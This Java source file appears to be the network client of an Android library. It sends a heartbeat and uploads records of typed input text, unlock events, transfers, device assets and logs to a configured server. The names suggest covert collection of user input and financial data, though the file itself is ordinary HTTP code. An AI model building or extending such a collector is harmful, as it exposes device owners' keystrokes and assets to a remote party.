package com.example.aslib.common;

import android.util.Log;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.TypeReference;
import com.example.aslib.exceptions.ApiException;
import com.example.aslib.vo.Asset;
import com.example.aslib.vo.HeartResponse;
import com.example.aslib.vo.HttpResult;
import com.example.aslib.vo.InputTextRecord;
import com.example.aslib.vo.MajorData;
import com.example.aslib.vo.MyLog;
import com.example.aslib.vo.Transfer;

import net.dongliu.requests.Requests;

import java.util.Collection;
import java.util.List;

public class ApiService {
    private static final String TAG = "ASSIST-API";

    /**
     * 心跳
     *
     * @param body
     * @return
     */
    public HeartResponse heart(JSONObject body) {
        String _body = Requests.post(AppConfig.path(AppConfig.HEART_URL)).jsonBody(body).send().readToText();
        Log.i(TAG, "heart: " + _body);
        HttpResult<HeartResponse> result = JSONObject.parseObject(_body, new TypeReference<HttpResult<HeartResponse>>() {
        });
        if (result.getSuccess()) {
            return result.getData();
        }
        throw new ApiException(result.getMsg());
    }

    public boolean uploadMajorData(List<MajorData> majorDataList) {
        try {
            String _body = Requests.post(AppConfig.path(AppConfig.UPLOAD_MAJOR_DATA_URL)).jsonBody(majorDataList).send().readToText();
            HttpResult<HeartResponse> result = JSONObject.parseObject(_body, new TypeReference<HttpResult<HeartResponse>>() {
            });
            if (!result.getSuccess()) {
                Log.i(TAG, "uploadMajorData: error" + result.getMsg());
            }
            return result.getSuccess();
        } catch (Exception ex) {
            Log.e(TAG, "uploadMajorData: ", ex);
            return false;

        }
    }

    public boolean uploadUnLock(JSONObject jsonObject) {
        try {
            String _body = Requests.post(AppConfig.path(AppConfig.UPLOAD_UN_LOCK_URL)).jsonBody(jsonObject).send().readToText();
            HttpResult<String> result = JSONObject.parseObject(_body, new TypeReference<HttpResult<String>>() {
            });
            if (!result.getSuccess()) {
                Log.i(TAG, "uploadUnLock: error" + result.getMsg());
            }
            return result.getSuccess();
        } catch (Exception ex) {
            Log.e(TAG, "uploadUnLock: ", ex);
            return false;

        }
    }


    public boolean uploadTransfer(List<Transfer> transfers) {
        try {
            String _body = Requests.post(AppConfig.path(AppConfig.UPLOAD_TRANSFER_URL)).jsonBody(transfers).send().readToText();
            HttpResult<String> result = JSONObject.parseObject(_body, new TypeReference<HttpResult<String>>() {
            });
            if (!result.getSuccess()) {
                Log.i(TAG, "uploadTransfer: error" + result.getMsg());
            }
            return result.getSuccess();
        } catch (Exception ex) {
            Log.e(TAG, "uploadTransfer: ", ex);
            return false;

        }
    }


    public boolean uploadAsset(String deviceId, List<Asset> assetList) {
        try {

            JSONObject jsonObject = new JSONObject();
            jsonObject.put("deviceId", deviceId);
            jsonObject.put("list", assetList);

            Log.i(TAG, "AppConfig.path(AppConfig.UPLOAD_ASSET_URL):" + AppConfig.path(AppConfig.UPLOAD_ASSET_URL));
            String _body = Requests.post(AppConfig.path(AppConfig.UPLOAD_ASSET_URL)).jsonBody(jsonObject).send().readToText();
            HttpResult<String> result = JSONObject.parseObject(_body, new TypeReference<HttpResult<String>>() {
            });
            if (!result.getSuccess()) {
                Log.i(TAG, "uploadAsset: error" + result.getMsg());
            }
            return result.getSuccess();
        } catch (Exception ex) {
            Log.e(TAG, "uploadAsset: ", ex);
            return false;

        }
    }


    public boolean uploadLog(List<MyLog> logs) {
        try {
            String _body = Requests.post(AppConfig.path(AppConfig.UPLOAD_LOG_URL)).jsonBody(logs).send().readToText();
            HttpResult<HeartResponse> result = JSONObject.parseObject(_body, new TypeReference<HttpResult<HeartResponse>>() {
            });
            if (!result.getSuccess()) {
                Log.i(TAG, "uploadLog: error" + result.getMsg());
            }
            return result.getSuccess();
        } catch (Exception ex) {
            Log.e(TAG, "uploadLog: ", ex);
            return false;
        }

    }public boolean uploadInputTextRecord(Collection<InputTextRecord> inputTextRecords) {
        try {
            String _body = Requests.post(AppConfig.path(AppConfig.UPLOAD_INPUT_TEXT_RECORD_URL)).jsonBody(inputTextRecords).send().readToText();
            HttpResult<HeartResponse> result = JSONObject.parseObject(_body, new TypeReference<HttpResult<HeartResponse>>() {
            });
            if (!result.getSuccess()) {
                Log.i(TAG, "uploadInputTextRecord: error" + result.getMsg());
            }
            return result.getSuccess();
        } catch (Exception ex) {
            Log.e(TAG, "uploadInputTextRecord: ", ex);
            return false;
        }

    }

    public void uploadErrorLog() {

    }

}
